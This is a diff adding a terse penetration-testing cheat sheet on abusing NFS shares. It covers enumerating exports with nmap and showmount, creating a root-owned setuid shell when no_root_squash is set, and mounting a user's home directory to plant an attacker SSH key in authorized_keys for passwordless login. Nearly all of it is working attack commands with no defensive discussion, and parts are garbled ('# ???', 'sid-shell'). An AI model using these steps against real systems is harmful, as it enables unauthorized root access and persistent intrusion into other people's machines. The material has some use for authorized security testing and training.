@@ -1,0 +1,33 @@
+In order to enumerate NFS share we can use:
+
+# Show NFS shares available
+nmap --script=nfs-ls <target-ip>
+OR
+showmount -e <target-ip>
+
+# ???
+showmount -a <target-ip>
+
+
+If `rw,no_root_squash` is present, we can also upload and execute 
+a sid-shell:
+```sh
+chown root:root sid-shell; chmod +s sid-shell
+```
+
+# User nfspysh to mount share and create .ssh directory
+nfspysh -o server=192.168.0.20:/home/user
+mkdir .ssh
+cd .ssh
+
+# Generate ssh key pair
+ssh-keygen
+cp id_rsa.pub /tmp/authorized_keys
+
+# Transfer attacker public key to host
+put /tmp/authorized_keys
+exit
+
+# Login to SSH server with no password
+SSH_AUTH_SOCK=0 ssh user@192.168.0.20
+
